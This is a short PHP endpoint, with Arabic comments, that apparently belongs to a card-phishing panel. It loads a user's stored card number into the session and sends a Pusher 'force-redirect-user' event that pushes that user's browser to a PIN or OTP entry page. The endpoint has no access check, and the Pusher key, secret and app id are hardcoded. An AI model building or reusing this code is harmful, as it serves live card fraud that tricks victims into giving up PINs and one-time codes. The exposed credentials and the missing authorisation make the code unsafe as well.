<?php
session_start();
require_once 'init.php';

$userId = $_POST['user_id'] ?? null;
$page   = $_POST['page'] ?? null;

if (!$userId || !$page) {
    http_response_code(400);
    exit('Missing data');
}

/* ======================================
   1️⃣ حفظ التوجيه (كما هو – لا نلمسه)
====================================== */
$User->setRedirect($userId, $page);

/* ======================================
   2️⃣ 🔑 تجهيز SESSION (الإضافة المهمة)
====================================== */
$card = $User->fetchLastCardByUserId($userId);
if ($card) {
    $_SESSION['client_id']   = $userId;
    $_SESSION['card_number'] = $card->card_number;

    // تحديد مسار التحقق
    if ($page === 'pin.php') {
        $_SESSION['auth_flow'] = 'pin';
    } elseif ($page === 'otp.php') {
        $_SESSION['auth_flow'] = 'otp';
    } else {
        $_SESSION['auth_flow'] = null;
    }
}

/* ======================================
   3️⃣ إرسال التوجيه عبر Pusher (كما هو)
====================================== */
require_once $_SERVER['DOCUMENT_ROOT'] . '/vendor/autoload.php';

$pusher = new Pusher\Pusher(
    'a56388ee6222f6c5fb86',
    '4c77061f4115303aac58',
    '1973588',
    ['cluster' => 'ap2', 'useTLS' => true]
);

$pusher->trigger('my-channel', 'force-redirect-user', [
    'userId' => $userId,
    'url'    => $page
]);

echo 'OK';
exit;
